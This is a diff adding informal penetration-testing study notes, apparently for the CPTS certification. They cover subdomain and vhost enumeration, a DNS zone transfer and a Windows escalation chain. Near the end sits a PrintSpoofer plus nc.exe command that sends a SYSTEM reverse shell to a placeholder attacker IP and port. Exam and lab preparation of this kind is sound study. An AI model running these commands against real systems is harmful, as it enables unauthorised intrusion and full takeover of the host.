@@ -1,0 +1,38 @@
+ok off rip, ffuf for all subdomains and or vHosts.. 
+add to etc/hosts and a text file
+run nmap on them all granted prolly gonna be the smae ports and protocols but for reporting its good
+if we want to be lil extra run ffuf off the sub domains 
+whatweb them subdomains and get that info  
+ALSO dig axfr maindomain.com @<externalIP>   -> this will give us extra or confirm our findings 
+
+eyewittness will prolly help too... initial access prolly gonna come from this... remember to like double or triple enumerate... if no easy wins... back to enumeration. 
+
+
+make sure to just download or move or just have ready all tools, static nmap, anything on desktop or easy to find folder... if there are command injections see what we can see with curl and burp 
+
+burp can be more helpful sometimes than curl and vice versa..  
+
+sharphound.exe lololol huge help today. 
+
+
+whoami → nt authority\...
+↓
+whoami /priv → SeImpersonate or SeAssignPrimaryToken
+↓
+Upload PrintSpoofer64.exe + nc.exe
+↓
+PrintSpoofer64.exe -c "nc.exe attacker_ip attacker_port -e cmd"
+↓
+NT AUTHORITY\SYSTEM shell = 💰
+
+🧪 CPTS Patterns
+🧷 Why PrintSpoofer?
+Because it abuses SeImpersonate to spawn a SYSTEM shell via named pipe hijack.
+The CPTS exam LOVES this because it’s fast, clean, and easy to chain with nc.exe.
+
+🧷 Why nc.exe?
+They want you to show you can exfil a shell (especially through webshells or limited cmd interfaces).
+
+
+
+
